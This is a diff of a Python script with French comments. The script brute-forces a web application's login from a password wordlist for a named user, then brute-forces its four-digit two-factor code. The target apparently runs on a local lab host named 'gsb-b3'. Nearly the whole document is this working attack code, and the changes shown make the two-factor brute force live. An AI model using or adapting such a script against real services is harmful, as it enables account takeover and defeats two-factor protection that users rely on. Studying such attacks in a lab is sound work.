@@ -4,13 +4,14 @@ import base64
 #import time
 
 class Bruteforcer() :
-    def __init__(self, wordlist, hostname, url, uri='/'):
+    def __init__(self, wordlist, hostname, url, uri='/', **passwd):
         self.wordlist = wordlist
         self.hostname = hostname
         self.url = url
         self.uri = uri
         self.hyperlink = self.url + self.uri
         self.session = requests.Session()
+        self.passwd = passwd
 
     # Informe du code HTTP reçu
     def getHTTPCode(self, requete):
@@ -31,18 +32,20 @@ class Bruteforcer() :
             # header = self.getHeader()
             while continuer :
                 with open(self.wordlist, 'r') as passwordList:
-                    for passwd in passwordList :
-                        passwd = passwd.replace("\n", "")
-                        print("Tentative avec le mot de passe : " + passwd)
-                        payload = self.getPayload('lvillachane', passwd)
-                        requeteHTTP = requests.post(self.hyperlink, data=payload)
+                    for self.passwd in passwordList :
+                        self.passwd = self.passwd.replace("\n", "")
+                        print("Tentative avec le mot de passe : " + self.passwd)
+                        payload = self.getPayload('lvillachane', self.passwd)
+                        requeteHTTP = self.session.post(self.hyperlink, data=payload)
                         #print(requeteHTTP)
                         #print(requeteHTTP.text)
                         #self.haveIBeenRedirected(requeteHTTP)
                         if 'code à 4 chiffres' in requeteHTTP.text :
-                            print("\nMot de passe trouvé : " + passwd)
+                            print("\nMot de passe trouvé : " + self.passwd)
                             continuer = False
-                            #self.bruteforce2FA()
+                            self.bruteforce2FA(requeteHTTP)
+                            break
+                            """
                             for i in range(1000, 9999):
                                 code = {
                                     'code': i
@@ -58,24 +61,28 @@ class Bruteforcer() :
                                     print("Le code est : ",i)
                                     # On s'arrête lorsque c'est trouvé !
                                     break
+                            """
 
-    def bruteforce2FA(self) :
-        with self.session as s:
-            for i in range(1000, 9999):
-                code = {
-                    'code': i
-                }
-                # On teste le code
-                p = s.post('http://' + self.hostname + '/index.php?uc=connexion&action=valideA2fConnexion', data=code)
-                # On essaye de récupérer la page d'accueil
-                r = s.get('http://' + self.hostname + '/index.php', data=code)
-                #elHTML = r.html.find('.glyphicon-home', first=True)
-                # Est-ce que l'on est connecté ?
-                print(i)
-                if 'glyphicon-home' in r.text :
-                    print("Le code est : ",i)
-                    # On s'arrête lorsque c'est trouvé !
-                    break
+    def bruteforce2FA(self, goodRequest) :
+        #with self.session as s:
+        for i in range(1000, 9999):
+            code = {
+                'code': i
+            }
+            # On teste le code
+            #p = self.session.post(self.hyperlink, data=code)
+            # On essaye de récupérer la page d'accueil
+            self.hyperlink = 'http://gsb-b3/index.php?uc=connexion&action=valideA2fConnexion'
+            r = self.session.get(self.hyperlink, data=code)
+
+            #elHTML = r.html.find('.glyphicon-home', first=True)
+            # Est-ce que l'on est connecté ?
+            print(i)
+            print(r.text)
+            if 'Afficher mes fiches de frais' in r.text :
+                print("Le code est : ",i)
+                # On s'arrête lorsque c'est trouvé !
+                break
 
 
     """
